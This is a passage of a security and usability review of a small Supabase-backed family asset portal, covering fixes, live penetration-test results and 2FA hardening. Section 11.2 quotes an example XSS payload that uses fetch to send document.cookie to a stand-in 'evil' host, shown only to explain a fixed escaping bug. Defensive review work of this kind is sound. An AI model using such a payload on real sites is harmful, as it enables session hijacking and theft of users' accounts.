# Houseago Asset Management — security & layout review

A full pass over the site: a hacker's-eye stress test of the front end and
back end, plus a check that the layout and navigation are as simple and
logical as they can be. Written after renaming the site from "Houseago
Family Accounts" to "Houseago Asset Management."

Three buckets below: **fixed now** (code changes already made and
re-tested), **recommended, needs a few minutes in the Supabase dashboard**
(not code — settings only you can change, since they need your project
access), and **accepted limitation** (understood and mitigated as far as
is practical, but not fully closable given the hosting platform).

## 1. What was fixed

### 1.1 `entities` table wasn't covered by the 2FA requirement

Once an account turns two-factor on, the database is supposed to refuse to
hand back anything until that session has completed a code challenge — not
just documents, but the account's own access rows. The restrictive
`mfa_ok()` policy from the 2FA work had been added to `portal_access`,
`entity_documents`, and Storage, but not to `entities` itself. That meant a
session stuck at password-only (aal1) could still read the full list of
property and person names — not documents, just names — regardless of
whether 2FA was meant to be blocking it.

**Fixed**: added the same restrictive `mfa_ok()` policy to `public.entities`
in `supabase-schema.sql`. Re-run the updated schema file's section 5 in the
Supabase SQL editor to apply this (safe to re-run — `create policy` will
just fail harmlessly if it's already there, or you can drop and re-create
the "Require completed 2FA once enrolled" policy on `entities` if needed).

### 1.2 Receipts & Invoices "Relates to" link had no access check

On the Receipts & Invoices page, a submission can optionally be tagged as
relating to a property or account (the "Relates to" dropdown). The insert
policy checked that you had upload rights on the receipts entity itself,
but never checked whether you had *any* access at all to the entity you
were linking it to. That meant someone could tag a receipt against a
property they have zero access to — not a document leak on its own (they
still couldn't read that property's own documents), but it would plant a
stray entry that shows up in that property's Income & Outgoings totals for
whoever *does* have access, and it let someone probe for whether a given
entity id exists at all.

**Fixed**: the insert policy on `entity_documents` now also requires a
`portal_access` row (any row — just visibility, not upload rights) on
`related_entity_id` before allowing the link. See `supabase-schema.sql`
section 3 for the updated policy and its comment.

### 1.3 QR code image was silently broken

Found while reviewing screenshots, not by a test: the two-factor
authenticator-app QR code on the security page rendered as a blank box with
stray text next to it. The QR code is a data-URI SVG string inserted into
an `<img src="...">` attribute; the string contains literal `"` characters
(from `xmlns="..."` inside the SVG), which broke out of the attribute and
corrupted the markup. The existing HTML-escaping helper only escaped
`&`/`<`/`>` — safe for ordinary text content, but not sufficient inside an
attribute value.

**Fixed**: added a second escaping helper (`escapeAttr`) that also escapes
quote characters, and used it for the QR image's `src`. This is a real bug
that would have affected every real enrolment, not just the test — worth
noting since it shipped once already and only surfaced visually.

### 1.4 Sample-preview mode threw a JavaScript error and silently failed

Running the login page and dashboard without a configured Supabase project
(the state the site is in before `assets/supabase-config.js` is filled in —
also what a first-time visitor or anyone testing the site sees) threw an
uncaught error: `receiptsCardHtml is not defined`. That function is called
but was never defined anywhere in the codebase — leftover from an earlier,
incomplete edit. Because the error was thrown partway through building the
sample dashboard's HTML, the whole render aborted: the entity cards never
got written to the page, and their click handlers (which show the "this is
a sample preview" message) never got attached either. In effect, the
sample-preview dashboard was silently broken.

**Fixed**: removed the broken call and its now-orphaned leftover code (a
click handler wired to a link that could never have existed). The sample
preview now renders cleanly and matches what real data actually looks
like. Caught by the regression suite's `production-sample-test.js`, which
loads the real HTML files directly rather than a mock.

### 1.5 Two-factor "Turn off" button didn't require a fresh code

This is the most significant finding of the review. Supabase's MFA
management calls (`listFactors`, `unenroll`, and friends) are handled by
the Auth service directly — they are **not** Postgres table operations, so
none of the row-level-security policies above can reach them. By design,
Supabase allows these calls at aal1 (password-only). That means, before
this fix, anyone who obtained just your password — a phished credential, a
reused password from another breach, a saved-password grab from a
compromised device — could open the security page and switch two-factor
off entirely, with nothing else required. It would look, from the account
owner's side, like 2FA had simply stopped working.

This can't be fixed at the database level, because the unenroll call never
touches the database. The mitigation has to live in the page itself.

**Mitigated**: the "Turn off two-factor authentication" button is now only
shown when the *current session* has itself completed a fresh code
challenge this login (Supabase reports this as the session's assurance
level, "aal2"). A session that's only ever done password-only login — even
on an account that has 2FA turned on — sees an explanation instead: "To
turn this off, log out and log back in with a code from your authenticator
app first — then come back here." A password-only compromise can no longer
silently strip your protection; the attacker would additionally need your
authenticator app.

**Be aware this is a UI-level control, not an unbreakable one.** Someone
with your password and comfortable using browser developer tools could
still call `unenroll()` directly through the Supabase JS SDK, bypassing the
page entirely — the button being hidden stops casual/UI-level abuse, not a
technically determined attacker. There is no way to close this gap
completely without Supabase adding server-side aal2 enforcement to its own
MFA-management endpoints, which is outside this site's control. Practical
compensating measures: keep your password unique to this site (a password
manager makes this easy) and treat any suspicious "your 2FA looks like it
turned off" moment as a signal your password may be compromised, not just
a glitch.

Covered by a new Playwright test (`security-page-test.js`): a
session with an already-verified factor that hasn't completed an aal2
challenge this session must not show the turn-off button, and must show
the explanatory message instead.

### 1.6 Clickjacking — added a JavaScript mitigation

GitHub Pages serves static files with no way to set custom HTTP response
headers, which rules out the standard fix for clickjacking
(`X-Frame-Options` or a `Content-Security-Policy: frame-ancestors`
directive telling browsers to refuse to render the page inside someone
else's `<iframe>`). Without either, in principle another site could embed
this portal in an invisible iframe and trick someone into clicking through
it, potentially triggering an action on their behalf while they think
they're clicking something else.

**Mitigated**: every page now carries a small inline script, as the very
first thing in `<head>`, that detects whether it's been loaded inside a
frame and — if so — immediately navigates the top-level page to itself
(breaking out of the frame) and hides the page's content in the meantime.
This is a reasonable defence-in-depth measure but not bulletproof: a
frame with `sandbox="allow-scripts"` and no `allow-top-navigation` can
suppress the redirect attempt. See the recommendation below for the real
fix.

**Recommended real fix (not code — a hosting change)**: put the domain
behind a reverse proxy that can set real HTTP headers — Cloudflare's free
tier is the standard choice for a GitHub Pages site, and it would let you
set `X-Frame-Options: DENY` (or a CSP frame-ancestors directive) properly,
closing this gap completely rather than best-effort. Not required — the
JS mitigation covers the common case — but worth doing if you want this
fully closed rather than mostly closed.

## 2. Recommended — a few minutes in the Supabase dashboard

These aren't code changes; they're project settings only you can turn on,
since they need access to your Supabase dashboard.

- **Leaked-password protection** (Authentication → Policies, or
  Authentication → Providers → Email, depending on your dashboard
  version): Supabase can check a password against the HaveIBeenPwned
  breached-password list at signup/password-change time and refuse known-
  compromised ones. Since accounts here are created directly by you rather
  than self-signup, this mainly matters if/when a password is ever changed
  — worth turning on regardless, no downside.
- **Storage upload limits** (Storage → owner-documents → bucket settings):
  the site's own upload form doesn't enforce a maximum file size or a
  strict file-type allow-list client-side — the `accept="application/pdf,
  image/*"` attribute on the file picker is just a suggestion to the
  browser's file dialog, not a real restriction (anyone can still attach
  any file type via drag-and-drop or by renaming a file). Setting a
  max file size and allowed MIME types on the bucket itself is what
  actually enforces this. A sensible starting point: 25MB max, PDF and
  common image types only.
- **Session/JWT expiry** (Authentication → Sessions): worth checking the
  default expiry is something you're comfortable with for documents this
  sensitive — shorter is safer but means logging in more often. This is a
  judgement call, not a fixed recommendation either way.
- **Rate limiting on auth attempts**: Supabase applies its own default
  rate limits to login/verify attempts, which is reasonable protection
  against brute-forcing a password or a 2FA code as-is — nothing to change
  here, just worth knowing it's already on by default rather than
  something this site's own code provides.

## 3. Accepted limitations (understood, not fully closable)

- **No custom HTTP security headers on GitHub Pages** — covered above
  (clickjacking). The JS mitigation is a reasonable stand-in; a proxy like
  Cloudflare is the complete fix, if you want it.
- **MFA unenroll is reachable at aal1 via the Supabase SDK directly** —
  covered above (1.5). Mitigated in the UI; not closable from this side of
  the fence at all.
- **The anon key is public by design.** This is not a bug — it's how
  Supabase's client-side model works, and it's why every table has row-
  level security switched on rather than relying on the key itself for
  protection. Confirmed clean: no `service_role` (secret) key appears
  anywhere in the site's own client-shipped files. The one place
  `service_role` is used at all — the `expiry-digest` email-reminder
  function — runs entirely on Supabase's servers as an Edge Function, never
  shipped to a browser, which is the correct and only place that key
  should ever live.
- **No self-signup or password-reset flow is exposed on the site** — this
  is a deliberate strength worth naming, not a gap: accounts are
  provisioned by you directly in the Supabase dashboard, so there's no
  public "create account" or "forgot password" surface for an attacker to
  probe at all.

## 4. Layout & navigation review

The site's information architecture, checked end to end:

**Login → Dashboard → (Property or Person page) → Documents**, with
Receipts & Invoices reachable from a person's own page, and Account &
Security reachable from the header on every page. That's a consistent
three-or-four-click depth to any document from login, which is about as
flat as a structure like this can reasonably get — there wasn't a case
found where a document needed more clicks than the shape of the data
actually requires (e.g. a property's own Insurance section genuinely is
one level under that property, not an accident of navigation design).

The two-upload-point simplification done earlier in this project (merging
what used to be several separate sections per property — Documents,
Compliance & Tenancy, Insurance — into a single "Documents" card with a
Type dropdown, alongside one Income & Outgoings section) is the single
biggest thing already done for simplicity, and it's still the right call:
fewer sections to scan, one place to look for "everything about this
property," one upload form instead of three.

A few smaller observations, in order of how much they'd actually help:

- **The dashboard is the one page most people will land on most often**,
  and it used to list every entity a user has access to as one flat set of
  cards. For Oscar/Sally, who have access to a lot of entities, this was a
  long scroll. **Now done**: cards are grouped under "Company,"
  "Properties," and "People" headings, each with a subtle divider, in that
  fixed order — the order of cards within each group still follows
  `sort_order`, exactly as before, and access rules haven't changed at
  all. A group with nothing in it is skipped, and if everything a given
  user sees falls into just one group, no heading shows at all. Covered by
  a new assertion in `dashboard-test.js` checking the group labels appear
  in the right order.
- **The header brand link ("Houseago") is the only way back to the
  dashboard from most pages that isn't an explicit "Back to dashboard"
  button** — worth double-checking on a phone-width screen that it's
  obviously tappable, since it's the de facto "home" affordance. This
  wasn't found to be broken, just worth a quick look given it's a small
  target.
- **Compliance status and expiry warnings** (gas safety, EICR, EPC,
  legionella) live on the dashboard as a banner and drive real urgency —
  their placement above the entity cards is correct and shouldn't move;
  flagging only because it's the one piece of the layout where getting the
  position right actually matters for someone noticing an expiring
  certificate in time.

Nothing found suggests the underlying structure is illogical — it maps
cleanly onto how the properties and people are actually organised, and the
earlier documents-consolidation work already did most of the simplification
that was available. The suggestions above are refinements, not fixes.

## 5. Testing

All of the above was verified with the project's existing Playwright
regression-test discipline — mocked Supabase clients, driven headlessly,
asserting on rendered DOM state and console/page errors — rather than
assumed correct:

- A new test scenario (in `security-page-test.js`) exercises the aal1 vs
  aal2 gating on the "Turn off two-factor authentication" button directly.
- The sample-preview crash (1.4) was caught by `production-sample-test.js`,
  which loads the real site files rather than a mock — a reminder that a
  mock-only test suite can miss a real production bug if nothing in the
  suite ever loads the actual HTML/JS as shipped.
- The full existing regression suite (dashboard, property/person pages,
  receipts, compliance status, expiry digests, MFA login, self-assessment
  banners, and more) was re-run after every change in this review and
  passes cleanly.

`sw.js`'s cache version was bumped so every visitor picks up these changes
on next load rather than serving a stale cached copy.

## 6. Live penetration test (14 Sep 2026, against the real deployed site)

Everything above was tested against mocks or the site's own code. This
round tested the actual live GitHub Pages site and Supabase project,
adversarially — no accounts, no cooperation from the app's own JavaScript,
just the same public URLs and API endpoints anyone else can reach.

### 6.1 Found and fixed: anyone could self-register an account

The site has no signup form, but "Allow new users to sign up" was still
switched on in Supabase Auth — meaning anyone who found the project's URL
and anon key (both are meant to be public, by design) could call the
Auth API directly and create a fully confirmed account in one request,
without ever touching the site's UI. Confirmed live: a throwaway test
account was created this way, used to log in, cleaned up immediately
after.

That account could then read the full `entities` table — all 36 rows:
the Ltd company, both Chaucer Street properties, 33 North Denes, 3
Horning Close, Wild Thyme, and Oscar/Sally/Iris's names against each of
their sole trader, bank statement, investment and payslip sections. Not
documents or figures — `entities` is just labels, deliberately readable
by "anyone signed in" so the account-creation flow can show names — but
still the shape of the whole company and family finances, to anyone who
could get an account.

**Fixed**: "Allow new users to sign up" is now off. Every account still
has to be created by Oscar from the Supabase dashboard, same as always —
this just closes the back door that let someone skip that step entirely.
Re-tested live: the signup endpoint now returns `signup_disabled`.

### 6.2 Everything else held

- **No data readable without logging in.** Direct REST API calls to
  `entities`, `portal_access`, and `entity_documents` with just the
  public anon key (no session) all correctly returned "permission
  denied" — confirmed live, not assumed from the policy text.
- **No data readable through someone else's account.** The throwaway
  test account above — signed in, but with zero `portal_access` rows —
  got an empty result from `portal_access`, `entity_documents`, and
  Storage, no matter what it asked for. Row-level security is doing the
  actual filtering, not the app's JavaScript, so nothing an attacker
  types into the browser console can get around it.
- **Storage bucket doesn't leak by direct access either.** Tried listing
  and fetching files in `owner-documents` with no session and with the
  throwaway account — both denied/empty. Bucket enumeration
  (`/storage/v1/bucket`) returns nothing to a signed-out caller.
- **No secrets ever committed.** Checked the full git history (all 3
  commits), not just the current files — only the intentionally-public
  anon/publishable key appears anywhere. No database password, no
  `service_role`/secret key, no `.env` file.
- **Pages don't leak data before the login check runs.** Loading
  `dashboard.html`, `property.html`, etc. directly with no session
  redirects to the login page — and this is belt-and-braces only, since
  the real protection (RLS, above) doesn't depend on that redirect
  happening at all.
- **The 2FA-enforcement policies are wired correctly.** Confirmed by
  inspecting the live database's actual policy definitions (not just the
  schema file) — all four restrictive `mfa_ok()` policies are present on
  the right tables (`entities`, `portal_access`, `entity_documents`,
  `storage.objects`) with the right condition. Not re-tested end-to-end
  live, since no account has turned 2FA on yet to exercise the "blocked"
  path against a real session — the earlier mock-based test in section 5
  covers that behaviour.
- **Clickjacking mitigation is present on every page** on the live site,
  matching what section 1.6 added.

### 6.3 Accepted, not a bug

Any signed-in account — even one with no sections granted yet — can
still read the `entities` table's names. This is intentional (see 6.1)
and was already documented; closing the open-signup hole means the only
way to get an account at all is Oscar creating one, which limits this to
people he's already decided should have some access.

## 7. Second live penetration test (14 Sep 2026, same day — more aggressive)

Round two, at Oscar's request to push harder. First re-confirmed every
fix from section 6 was still live (it was), then went after the write
path and the account system itself, using a throwaway test account
created and deleted via the Supabase dashboard for the purpose (never a
real account, cleaned up completely afterwards, including every row it
touched).

### 7.1 Found and fixed: `uploaded_by` could be forged

The test account was given real, narrow access — upload rights to
exactly one section, nothing else, the same shape any real account has.
With that access, it could insert a genuine, allowed document — but the
`uploaded_by` field on that row had no check tying it to who was
actually signed in. It could set `uploaded_by` to Oscar's real account
ID, and the database accepted it. Confirmed live: a row now existed
saying Oscar uploaded a document he'd never seen, from an account that
wasn't his.

This doesn't expose anything — the attacker still needs real upload
access to some section first, same as before — but it breaks the "who
actually uploaded this" record for the sections it does touch, which
matters for anything you'd treat as an audit trail (who submitted an
expense, whose name is on a document if it's ever disputed).

**Fixed**: the insert rule for documents now also requires
`uploaded_by` to either be left blank or match the real signed-in
account — never anyone else's. Re-tested live: the same forgery attempt
now gets rejected, while a normal upload (setting `uploaded_by` to your
own ID, or not setting it at all — both are how the site's own code
does it) still works exactly as before.

### 7.2 Everything else held, including under direct attack

- **Cross-section writes, not just reads.** With access to only one
  section, the test account tried inserting documents into others it
  had no grant for — rejected every time, `row-level security policy`
  violation, exactly as the read-side test in section 6 already showed
  for reads.
- **Storage path tricks didn't work.** Tried uploading into another
  section's folder directly, and via a `../` path-traversal payload
  aimed at escaping the one folder it did have access to — both
  rejected. Only the legitimate folder accepted the upload.
- **JWT tampering was rejected outright.** Took the test account's own
  login token, edited it directly — swapped in Oscar's account ID,
  marked itself as fully verified 2FA, even tried claiming
  `service_role` (Supabase's own full-access key type) — and sent it
  back without a valid signature, since forging one isn't possible
  without the project's private signing key. Rejected immediately,
  wrong signature. This is the strongest form of "pretend to be someone
  else" attack there is against this kind of system, and it doesn't
  work.
- **No SQL/filter injection.** Tried classic injection-style payloads
  in the API's filter parameters — the query layer treats them as
  literal text to match, never as code, so nothing came back except
  correctly-empty results.
- **No account enumeration.** A wrong password on Oscar's real email
  and a wrong password on an email that's never existed produce the
  identical error. The password-reset endpoint responds identically
  either way too — nothing lets an outsider figure out who has an
  account here.
- **Login attempts are rate-limited.** Ten rapid wrong-password
  attempts all went through without being blocked — expected, Supabase
  allows up to 360 sign-in attempts per IP every 5 minutes by default,
  which is the standard, reasonable setting; brute-forcing a real
  password past that limit isn't practical, and 2FA is the stronger
  answer for this anyway (see section 1.5/13).
- **No secrets anywhere.** Re-swept every deployed file and the full
  git history again for anything that shouldn't be public — clean.
  There's no custom deployment workflow in this repo either (GitHub
  Pages deploys itself automatically), so there's no build log that
  could ever leak something by accident.

All test data — the throwaway account, its one access grant, the
documents it created (including the forged one, before the fix) — was
deleted immediately after each test. Nothing pentest-related remains
anywhere in the live project.

## 8. Security hardening, self-service password reset, and a benchmark against Xero/QuickBooks (15 Sep 2026)

Following on from the pentest rounds above, turned on every remaining
free security setting on both the Supabase side and the GitHub side,
added a proper self-service password reset flow (there wasn't one
before — this was a real gap), and checked how the site's security
compares to Xero and QuickBooks Online, since those are the standard
your accountant and Sally will implicitly be comparing it to.

**Supabase settings turned on:**
- Minimum password length raised from 6 to 10 characters, with a new
  requirement for a mix of uppercase, lowercase, a number, and a
  symbol (previously no character-type requirement at all).
- "Require current password when updating" — previously a hijacked
  session, or someone at an unlocked laptop, could change the account
  password without knowing the existing one. Now the account's
  current password is required to change it.
- "Prevent use of leaked passwords" (HaveIBeenPwned check) is *not*
  on — it's a Supabase Pro-plan feature, not available on the current
  plan.

**GitHub settings turned on:** private vulnerability reporting,
dependency graph, Dependabot alerts (including malware alerts and
security updates), secret scanning, and secret scanning push
protection (blocks a commit containing a real secret before it's even
pushed). Left off: Dependabot version updates and CodeQL code
scanning — both need a dependency manifest or compiled code to do
anything, and this is a plain static site with neither.

**Self-service password reset**, since there wasn't one before (the
only way to change a password used to be asking whoever holds the
Supabase Admin Users screen):
- A "Forgot your password?" link on the login page, which emails a
  reset link via Supabase's own resetPasswordForEmail — shows the
  same message whether or not the address has an account, so it can't
  be used to check who has a login here, same as the login and
  recovery endpoints already tested in section 7.
- A new `reset-password.html` page that the emailed link lands on,
  which waits for Supabase to confirm the link is genuine before
  showing a "set a new password" form, and shows a plain "this link is
  invalid or has expired" message otherwise rather than a raw error.
- A "Change password" form on the Account & Security page for anyone
  already signed in, which requires the current password (see above).
- Updated the Supabase project's Site URL (was still the default
  `localhost:3000`) and added the live site to the redirect URL
  allow-list, since without that the reset link would have silently
  failed to come back to the right page.
- Tested live end-to-end: requested a reset for Sally's real address,
  got the same "if this has an account" message either way, and
  confirmed `reset-password.html` correctly rejects a direct visit
  with no valid token rather than erroring or exposing anything.

**Benchmark against Xero and QuickBooks Online:** the one real gap is
two-factor authentication. Both Xero and QuickBooks Online *mandate*
MFA for every user — it isn't optional, and on Xero in particular you
cannot keep using the product at all without setting it up. This
portal has the same TOTP-based 2FA available (see section 13 /
security.html) but it's opt-in — each of Oscar, Sally, and the
accountant has to turn it on themselves, and nothing currently forces
that. Password rules are already at or above the bar either service
sets (QuickBooks requires 8+ characters with letters, numbers, and
symbols; this site now requires 10+ with the same mix). Neither
service publishes a specific failed-login lockout policy beyond rate
limiting, which this site already has via Supabase's defaults (see
section 7.2).

**Recommended next step, not yet done:** decide whether to make 2FA
mandatory rather than optional — the groundwork (TOTP enrollment,
server-side enforcement once a factor is verified) is already built
and working, so making it compulsory would mean gating first login
behind setup rather than any new database or auth work. Worth doing
if the portal will hold anything an accountant or insurer would
expect to be behind MFA as standard, which is increasingly the norm
for this category of software.

## 9. Two-factor authentication made compulsory (15 Sep 2026)

Following on directly from the "recommended next step" at the end of
section 7 above: 2FA is no longer optional. Every account is now required
to have an authenticator app set up, and the prompt to do so appears
immediately, inline, on the login page itself — never a separate trip to
the account-management page.

**What changed:**

- **A never-enrolled account** gets walked straight into setup (QR code,
  setup key, confirm code) right after the password step succeeds, on
  `index.html` itself. There is no way to reach the dashboard without
  finishing this.
- **An already-enrolled account** still gets the same inline code-entry
  step as before, immediately after the password step — nothing changed
  there.
- **The database itself now requires it, full stop.** `mfa_ok()` in
  `supabase-schema.sql` no longer has an exemption for an account with no
  verified factor — previously it did, which is what made 2FA opt-in in
  practice even though the enforcement policies existed. Now every read
  and write to `entities`, `portal_access`, `entity_documents`, and
  Storage requires a session that has actually completed a 2FA challenge
  this login, regardless of whether the account has ever set one up.
- **Closed a gap this also revealed:** `dashboard.html`, `property.html`,
  and `person.html` previously only checked that *a session existed*, not
  that it had cleared 2FA — so an old, already-authenticated-at-aal1
  browser tab could reach those pages directly, skipping the login page's
  own MFA/enrollment gate entirely (the database would have refused the
  actual data either way, but the page itself gave no way back into
  setting up 2FA). All three now check the session's assurance level on
  load and send anything short of a completed 2FA challenge back to
  `index.html`, which handles both the "never enrolled" and "enrolled but
  not yet challenged this login" cases.

**Live-tested end to end** against Sally's account: logged in with no
factor enrolled → forced straight into the QR/setup-key/confirm-code flow
on the login page → completed it → landed on the dashboard with her usual
access intact. Then logged in again (factor now enrolled, fresh session at
aal1) → got the existing inline code step, not the enrollment flow →
tried navigating straight to `dashboard.html` before entering a code → got
sent back to `index.html` automatically → entered the code → reached the
dashboard normally. Also confirmed `person.html` behaves the same way for
an already-cleared session, and that the tightened database rule doesn't
block a session that has genuinely completed 2FA (Sally's dashboard loaded
her full set of properties and people as normal, not an error).

**One thing to know:** because this is enforced at the database level
immediately, Oscar's own account (and any other account that hasn't set up
2FA yet) will be walked into the same setup flow the very next time it
logs in — there's nothing else to do to make that happen, but it's worth
knowing the first login after this change will look different than usual.

## 10. Final stress test (15 Sep 2026) — a real bug found and fixed

Requested as a last, intense adversarial pass before treating the site as
finalised. Covered, against the live site and database:

- **Unauthenticated access**: confirmed anonymous requests to `entities`,
  `portal_access`, `entity_documents`, and Storage all come back empty —
  RLS blocks everything without a valid session.
- **Signup abuse**: public signup is disabled at the Supabase project
  level (`"Signups not allowed for this instance"`), so no route to create
  an account exists outside Oscar adding one by hand.
- **aal1-vs-aal2 boundary**: a session stuck at password-only, for an
  account with 2FA enrolled, was tested directly against the database
  (not just through the UI) and confirmed blocked on every table and on
  Storage — matches section 9's tightened `mfa_ok()`.
- **Cross-entity access**: tried reading and writing another entity's
  documents from a session that shouldn't have access to it. First attempt
  looked like it might have slipped through — turned out to be a false
  alarm caused by testing against an entity (Iris's) where Sally
  legitimately does have upload access alongside Oscar. Re-tested against
  an entity with zero `portal_access` rows for that session and got a
  clean, hard block, confirming RLS is sound.
- **Storage path/RLS boundaries**: confirmed the entity-id folder
  convention Storage relies on for scoping isn't exploitable — Storage
  treats `/` as a literal character in object names with no `..`
  traversal, and the RLS policies on `storage.objects` were read directly
  from `pg_policies` and match what's intended.
- **2FA unenroll-as-bypass**: confirmed Supabase itself refuses to
  unenroll a verified factor unless the session is already at aal2 — so a
  stolen aal1 session can't turn 2FA off to get around it.

**What this found**: the abandoned-enrollment fix from section 9 didn't
actually work. Live end-to-end testing (not just manual console checks)
kept reproducing the original "Could not start setup just now" failure
even from what looked like a clean state. Root cause turned out to be a
Supabase JS SDK quirk: `listFactors()`'s response has two shapes for the
same data — an authoritative `.data.all` array with every factor
regardless of status, and separate type-grouped arrays like `.data.totp`
— and `.data.totp` was proven, by comparing both side by side on a real
stuck test account, to sometimes come back empty even when `.data.all`
correctly lists the same unverified factor at the same moment. Every
place in the code that used `.data.totp` to decide "does an
unverified/verified factor exist" inherited this unreliability —
including a second, older instance of the same pattern in `security.js`'s
own account-settings 2FA toggle, which had been silently broken since
before this session's work even started.

**Fixed**: every one of these lookups (`auth.js`'s enrollment-cleanup,
cancel-link cleanup, post-login verified-factor check, and code-submit
handler; `security.js`'s status-loading cleanup) now derives
unverified/verified factors from `.data.all` filtered by
`factor_type === 'totp'`, never from the pre-grouped `.data.totp` array.

**Re-verified live**, through the real page-load flow rather than manual
replication (the thing that gave false confidence last time): reset to a
genuinely stuck test account (one real leftover unverified factor from
earlier testing), logged in three times in a row, abandoning setup after
each QR code without confirming — every attempt correctly cleaned up the
previous unverified factor and issued a fresh one, confirmed directly in
the database (exactly one `unverified` row at a time, never a pile-up).
On the fourth attempt, completed the flow for real with a generated
authenticator code and reached the dashboard normally, confirming the
happy path still works too. The disposable test account used for this was
deleted afterwards.

**Net result**: no exploitable vulnerability was found in the boundaries
tested above; the one real bug this stress test surfaced (the
`.data.totp` unreliability) is now fixed and confirmed live, and was
actually more significant than first realised — it affected both the new
compulsory-enrollment flow and the pre-existing account-settings 2FA
toggle.

## 11. Aggressive adversarial sweep (19 Sep 2026) — this repo, this document included

Requested explicitly as a "sweeping, comprehensive and aggressive" pass,
from a hacker's perspective, after the dashboard/monthly-chart work. Two
real findings, both fixed; everything else re-confirmed live and still
holding.

### 11.1 Found and fixed: this document, SETUP.md, and the database schema
were public

The single biggest finding of this round. The GitHub repo behind this site
has always been **public** (confirmed via the GitHub API — `private:
false`), a deliberate tradeoff documented in `SETUP.md` so that free
GitHub Pages could serve it without a paid plan. That's a reasonable
tradeoff for the site's own code — there's nothing secret in the
JavaScript — but GitHub Pages was configured to publish from the repo
root, which meant it was also serving every non-code file sitting there:
this document (`SECURITY_AND_UX_REVIEW.md`, every past pentest write-up,
in full, including exact exploit techniques already fixed), `SETUP.md`
(full walkthrough of the database structure, table names, and how the
project is wired together), and `supabase-schema.sql` (the literal table
definitions, column names, and every RLS policy, verbatim). Confirmed
live: all three were fetchable at their plain URLs
(`.../houseago-accounts-portal/SECURITY_AND_UX_REVIEW.md` etc.), no login
needed.

None of this granted access on its own — Postgres enforces row-level
security independently of whether an attacker has read the policy text,
and section 6 already confirmed anonymous requests get refused regardless.
But it was free, high-quality reconnaissance for no reason: the exact
names of every security control (`mfa_ok()`, the entity-id folder
convention, etc.), every attack already tried against this site
(including ones that worked before being fixed), and — beyond the
technical side — the Houseago family's and every property's names, laid
out for anyone who found the URL.

**Fixed**: restructured the repo so GitHub Pages only serves what the site
actually needs. Every published file (`index.html` and friends, `assets/`,
`manifest.webmanifest`, `robots.txt`, `sw.js`) moved into a new `docs/`
folder using `git mv` (keeps each file's history); this document,
`SETUP.md`, `supabase-schema.sql`, and the `supabase/` Edge Function
source (checked again in this pass — still clean, no secrets, pulls
`SUPABASE_SERVICE_ROLE_KEY` from its environment same as always) stay at
the repo root. GitHub Pages' publishing source was then switched from
"main / (root)" to "main / docs" in the repo's own Settings → Pages —
confirmed live: this document, `SETUP.md`, and the schema file all now
404, while every real page (checked `index.html` and `receipts.html`,
including its five CDN scripts) still loads cleanly with no console
errors. Nothing in the site's own HTML/JS needed rewriting for this — all
of its internal links were already relative, so `docs/` becoming the new
publish root didn't break anything.

**Not fully closed, your call if you want to go further**: the repo
itself is still public, so its full commit history and current source are
still visible to anyone on GitHub who looks (not just via the published
site). That's unavoidable on a free plan without either paying for GitHub
Pages from a private repo or moving to different hosting — and, as
before, there's genuinely no secret in the code itself (the anon/
publishable Supabase key is meant to be public; the one real secret,
`SUPABASE_SERVICE_ROLE_KEY`, only ever lives in the Edge Function's own
environment, never in the repo). Worth knowing, not urgent.

### 11.2 Found and fixed: attribute-context XSS in a few places, worst one
via a forged "bank statement"

A second, genuine bug class, the same one fixed once before for the 2FA
QR code (section 1.3) — `escapeHtml()` only escapes `&`/`<`/`>`, which is
safe for ordinary text but not for a value placed inside a double-quoted
HTML attribute (`value="..."`, `aria-label="..."`), where a `"` character
can break out and inject markup. That first fix wasn't applied everywhere
the same mistake existed.

**Worst instance**: `property.js`'s and `person.js`'s bank-statement-scan
feature (added earlier this project, reads a bank statement file via OCR
and suggests likely rent lines) rendered the OCR-extracted description and
date straight into `value="..."` attributes using `escapeHtml`, not an
attribute-safe escape. A bank statement is, by definition, a file someone
else can hand you — so a deliberately crafted "statement" (an image or
PDF) containing a line like `rent " autofocus onfocus="fetch('https://
evil/x?c='+document.cookie)` would, when the uploader picked that file,
break out of the attribute and execute in the uploader's own signed-in
session the instant the candidate rows render — no click needed. That's a
real path from "malicious file" to "your session, in your own browser."

**Also found**, lower severity — the same `escapeHtml`-in-an-attribute
mistake in several `<option value="...">` sites built from document years
or entity ids across `auth.js`, `property.js`, `person.js`, and
`receipts.js`. These need existing upload access to exploit (not a fully
outside attacker), so lower risk, but the same bug class.

**Fixed**: added a proper `escapeAttr()` (escapes quotes too, not just
`&`/`<`/`>`) to every file that was missing one (`property.js`,
`person.js`, `receipts.js`, `asset-overview.js` — `auth.js`,
`doc-scan.js`, and `security.js` already had one), and switched every
attribute-context site to use it. Every text-content site already using
`escapeHtml` was checked and confirmed correct — left alone.

### 11.3 Also done: pinned and hash-verified every third-party script

Not a live exploit, but a real supply-chain gap: every CDN-loaded library
(Supabase JS, pdf.js, Tesseract.js, jsPDF, SheetJS, JSZip) loaded with no
Subresource Integrity check, and `@supabase/supabase-js` was pinned only
to its floating major version (`@2`), so any 2.x release — including one
that never should have shipped, or a compromised one — would have loaded
automatically with zero review. Every script tag across every page now
carries a SHA-384 integrity hash and `crossorigin="anonymous"`, and
`supabase-js` is pinned to the exact version already in use (2.116.0).
Confirmed live: every page still loads with a clean console, meaning
every hash matches what's actually being served.

### 11.4 Re-confirmed live, still holding

Re-ran the core adversarial checks from sections 6, 7, and 10 against the
live site and database before declaring anything fixed:

- Unauthenticated REST calls to `entities`, `portal_access`, and
  `entity_documents` with only the public key: all still `401 permission
  denied`, not just an empty result — the anon role has no grant at all.
- Storage bucket listing (`/storage/v1/bucket`) with no session: still an
  empty array, no enumeration.
- Public signup: still `signup_disabled`.
- Storage object listing/fetching and a `../`-style path-traversal payload
  against the storage REST API directly: all still rejected
  (`permission denied for table portal_access` — the RLS-backed policy,
  not a filename check, is what's actually stopping this).
- Login and password-recovery responses for a real address vs. a
  nonexistent one: still identical, no account-enumeration signal. (One
  side-effect of this specific check: it fired a genuine password-reset
  email to Oscar's own real address, since testing this property means
  actually calling the recovery endpoint — flagged to him at the time,
  harmless, no email sent to anyone else.)

### 11.5 Everything fixed in this round is live

Both code fixes (11.2, 11.3) and the repo restructure (11.1) are pushed to
`main` and confirmed live — `sw.js` bumped to v31 for the code fixes, and
the Pages source change (11.1) took effect within about a minute of being
saved, verified by re-fetching the previously-public files and the live
site itself afterwards.

## 12. Full site sweep after adding Azure receipt scanning (20 Sep 2026)

Requested as a "full site security test" the day after Azure AI Document
Intelligence receipt scanning (`supabase/functions/scan-receipt`) was wired
into Receipts & Invoices. Re-confirmed every protection from sections 6, 7,
